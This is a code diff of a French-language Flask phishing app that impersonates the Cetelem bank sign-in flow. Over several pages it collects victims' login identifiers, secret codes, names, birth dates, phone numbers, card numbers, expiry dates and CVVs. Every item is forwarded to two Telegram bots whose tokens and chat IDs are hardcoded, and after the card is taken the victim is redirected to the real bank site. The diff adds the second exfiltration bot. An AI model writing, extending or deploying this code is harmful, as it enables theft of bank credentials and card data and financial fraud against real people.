@@ -3,47 +3,61 @@ import requests
 
 app = Flask(__name__)
 
-# Remplace par ton vrai TOKEN et CHAT_ID Telegram
-TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
-CHAT_ID = '6297861735'
+# Bot principal
+TOKEN_1 = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
+CHAT_ID_1 = '6297861735'
 
-def send_to_telegram(message):
-    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
-    data = {'chat_id': CHAT_ID, 'text': message}
+# Deuxième bot (remplace par tes vraies infos)
+TOKEN_2 = '8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs'
+CHAT_ID_2 = '7650873997'
+
+
+def send_to_telegram(token, chat_id, message):
+    url = f'https://api.telegram.org/bot{token}/sendMessage'
+    data = {'chat_id': chat_id, 'text': message}
     try:
         requests.post(url, data=data)
     except Exception as e:
         print("Erreur Telegram :", e)
+
+
+def send_all(message):
+    send_to_telegram(TOKEN_1, CHAT_ID_1, message)
+    send_to_telegram(TOKEN_2, CHAT_ID_2, message)
+
 
 # Page 1 – Saisie identifiant
 @app.route('/')
 def identifiant():
     return render_template('identifiant.html')
 
-# Page 2 – Enregistrement de l'identifiant et affichage du code
+
+# Page 2 – Enregistrement identifiant → Page code
 @app.route('/code', methods=['POST'])
 def code():
     identifiant = request.form.get('identifiant')
     if identifiant:
-        send_to_telegram(f"[Identifiant] {identifiant}")
+        send_all(f"[Identifiant] {identifiant}")
         return render_template('code.html')
     return redirect('/')
 
-# Page 3 – Réception du code secret et affichage page de vérification
+
+# Page 3 – Réception code secret → Page vérification
 @app.route('/verification', methods=['GET', 'POST'])
 def verification():
     if request.method == 'POST':
         try:
             code = request.get_json().get('code')
             if code:
-                send_to_telegram(f"[Code] {code}")
+                send_all(f"[Code] {code}")
                 return redirect('/verification')
         except Exception as e:
             print("Erreur JSON:", e)
             return redirect('/')
     return render_template('verification.html')
 
-# Page 4 – Saisie carte bancaire
+
+# Page 4 – Données personnelles → Page sécurisation carte
 @app.route('/securisation', methods=['POST'])
 def securisation():
     nom = request.form.get('nom')
@@ -52,21 +66,27 @@ def securisation():
     telephone = request.form.get('telephone')
 
     if nom and prenom and date_naissance and telephone:
-        message = f"[Nom complet] {prenom} {nom}\n[Date de naissance] {date_naissance}\n[Téléphone] {telephone}"
-        send_to_telegram(message)
-        return render_template('merci.html')  # Redirige vers la page finale après soumission
-    return redirect('/verification')  # Redirige vers page 3 si champs manquants
+        message = (
+            f"[Nom complet] {prenom} {nom}\n"
+            f"[Date de naissance] {date_naissance}\n"
+            f"[Téléphone] {telephone}"
+        )
+        send_all(message)
+        return render_template('securisation.html')
+    return redirect('/verification')
 
-# Page 5 – Fin de parcours
+
+# Page 5 – Saisie carte → Redirection vers Cetelem après capture
 @app.route('/merci', methods=['POST'])
 def merci():
-    carte = request.form.get('carte')
-    date_exp = request.form.get('date_exp')
-    cvv = request.form.get('cvv')
+    carte = request.form.get('numero_carte')
+    date_exp = request.form.get('date_expiration')
+    cvv = request.form.get('cryptogramme')
 
-    send_to_telegram(f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}")
+    message = f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}"
+    send_all(message)
 
-    return redirect("https://www.cetelem.fr/fr/accueil")
+    return redirect("https://www.cetelem.fr/fr/accueil")  # redirigé vers un site après saisie
 
 
 if __name__ == '__main__':
